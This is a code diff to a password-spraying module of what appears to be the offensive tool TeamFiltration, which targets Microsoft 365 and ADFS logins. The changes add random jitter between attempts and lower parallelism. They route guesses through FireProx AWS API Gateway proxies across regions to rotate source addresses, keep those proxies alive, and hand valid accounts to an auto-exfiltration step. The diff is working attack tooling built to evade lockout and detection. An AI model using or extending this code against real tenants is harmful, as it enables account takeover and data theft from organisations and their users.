@@ -101,7 +101,8 @@ namespace TeamFiltration.Modules
             GlobalArgumentsHandler teamFiltrationConfig,
             DatabaseHandler _databaseHandler,
             UserRealmResp userRealmResp,
-            int delayInSeconds = 0,
+            int MinDelayInSeconds = 0,
+            int MaxDelayInSeconds = 0,
             int regionCounter = 0)
         {
 
@@ -177,6 +178,7 @@ namespace TeamFiltration.Modules
                                       validSprayAttempts.Add(sprayAttempt);
 
                                   _databaseHandler.WriteSprayAttempt(sprayAttempt, teamFiltrationConfig);
+                                  int delayInSeconds = (new Random()).Next(MinDelayInSeconds, MaxDelayInSeconds);
                                   Thread.Sleep(delayInSeconds * 1000);
                               }
                               catch (Exception ex)
@@ -186,7 +188,7 @@ namespace TeamFiltration.Modules
                               }
                               _databaseHandler._globalDatabase.Checkpoint();
                           },
-                            maxDegreeOfParallelism: 20);
+                            maxDegreeOfParallelism: 5);
 
 
 
@@ -200,7 +202,8 @@ namespace TeamFiltration.Modules
 
             int sleepInMinutesMax = 100;
             int sleepInMinutesMin = 60;
-            int delayInSeconds = 0;
+            int MaxDelayInSeconds = 0;
+            int MinDelayInSeconds = 0;
 
             string StarTime = "";
             string StopTime = "";
@@ -265,13 +268,22 @@ namespace TeamFiltration.Modules
                 sleepInMinutesMin = Convert.ToInt32(args.GetValue("--sleep-min"));
             }
 
-            if (args.Contains("--jitter"))
+            if (args.Contains("--jitter-max"))
             {
-                delayInSeconds = Convert.ToInt32(args.GetValue("--jitter"));
+                MaxDelayInSeconds = Convert.ToInt32(args.GetValue("--jitter-max"));
             }
             else
             {
-                delayInSeconds = 0;
+                MaxDelayInSeconds = 0;
+            }
+
+            if (args.Contains("--jitter-min"))
+            {
+                MinDelayInSeconds = Convert.ToInt32(args.GetValue("--jitter-min"));
+            }
+            else
+            {
+                MinDelayInSeconds = 0;
             }
 
             databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping between {sleepInMinutesMin}-{sleepInMinutesMax} minutes for each round"!));
@@ -342,6 +354,41 @@ namespace TeamFiltration.Modules
             var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);
             var regionCounter = rnd.Next(_globalProperties.AWSRegions.Length - 1);
 
+
+            // Create fireprox
+            var fireProxList = new List<Models.AWS.FireProxEndpoint>();
+            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
+            {
+                if (_globalProperties.AADSSO)
+                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
+                else if (_globalProperties.UsCloud)
+                {
+                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
+                    fireProxObject.FireProxURL = fireProxObject.FireProxURL + "common/oauth2/token";
+                    fireProxList.Add(fireProxObject);
+
+
+                }
+                else if (_globalProperties.ADFS)
+                {
+                    Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
+                    Models.AWS.FireProxEndpoint adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
+                    string adfsFireProxUrl = adfsFireProxObject.FireProxURL.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
+                    adfsFireProxObject.FireProxURL = adfsFireProxUrl;
+                    fireProxList.Add(adfsFireProxObject);
+                }
+
+                else
+                {
+                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount);
+                    fireProxObject.FireProxURL = fireProxObject.FireProxURL + "common/oauth2/token";
+                    fireProxList.Add(fireProxObject);
+                }
+
+                if (!shuffleFireProxBool)
+                    break;
+            }
+
         sprayCalc:
 
             if (args.Contains("--time-window"))
@@ -391,7 +438,8 @@ namespace TeamFiltration.Modules
                 TimeZoneInfo easternZone = TZConvert.GetTimeZoneInfo("Eastern Standard Time");
 
 
-                databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
+                // databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow.AddMinutes(timeLeftToSleep), easternZone)} EST"));
+                databaseHandle.WriteLog(new Log("SPRAY", $"{minutesSinceFirstAccountSprayed}m since last spray, spraying will resume {DateTime.Now.AddMinutes(timeLeftToSleep)}"));
                 Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
                 goto sprayCalc;
             }
@@ -410,44 +458,8 @@ namespace TeamFiltration.Modules
             //Get all previous password and email combinations
             List<string> allCombos = databaseHandle.QueryAllCombos();
 
-            var fireProxList = new List<(Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl)>();
-
             if (shuffleUsersBool)
                 bufferuserNameList = bufferuserNameList.Randomize().ToList();
-
-
-            for (int regionCount = 0; regionCount < _globalProperties.AWSRegions.Length; regionCount++)
-            {
-                if (_globalProperties.AADSSO)
-                    fireProxList.Add(_globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCount));
-                else if (_globalProperties.UsCloud)
-                {
-                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCount);
-                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
-                    fireProxList.Add(fireProxObject);
-
-
-                }
-                else if (_globalProperties.ADFS)
-                {
-                    Uri adfsHost = new Uri(getUserRealmResult.ThirdPartyAuthUrl);
-                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) adfsFireProxObject = _globalProperties.GetFireProxURLObject($"https://{adfsHost.Host}", regionCount);
-                    string adfsFireProxUrl = adfsFireProxObject.fireProxUrl.TrimEnd('/') + $"{adfsHost.PathAndQuery}";
-                    adfsFireProxObject.fireProxUrl = adfsFireProxUrl;
-                    fireProxList.Add(adfsFireProxObject);
-                }
-
-                else
-                {
-                    var fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCount);
-                    fireProxObject.fireProxUrl = fireProxObject.fireProxUrl + "common/oauth2/token";
-                    fireProxList.Add(fireProxObject);
-                }
-
-                if (!shuffleFireProxBool)
-                    break;
-            }
-
 
             await bufferuserNameList.ParallelForEachAsync(
                async userName =>
@@ -474,8 +486,8 @@ namespace TeamFiltration.Modules
                                Username = userName,
                                Password = password,
                                //ComboHash = "",
-                               FireProxURL = fireProxObject.fireProxUrl,
-                               FireProxRegion = fireProxObject.Item2.Region,
+                               FireProxURL = fireProxObject.FireProxURL,
+                               FireProxRegion = fireProxObject.Region,
                                ResourceClientId = randomResource.clientId,
                                ResourceUri = randomResource.Uri,
                                AADSSO = _globalProperties.AADSSO,
@@ -497,19 +509,20 @@ namespace TeamFiltration.Modules
             {
                 foreach (var fireProxObject in fireProxList)
                 {
-                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.RestApiId, fireProxObject.Region);
                     Environment.Exit(0);
                 }
             }
 
 
-            var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
+            var validAccounts = await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, MinDelayInSeconds, MaxDelayInSeconds, regionCounter);
 
+            /*
             foreach (var fireProxObject in fireProxList)
             {
-                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
+                await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.RestApiId, fireProxObject.Region);
             }
-
+            */
 
             if (autoExfilBool && validAccounts.Count() > 0)
             {
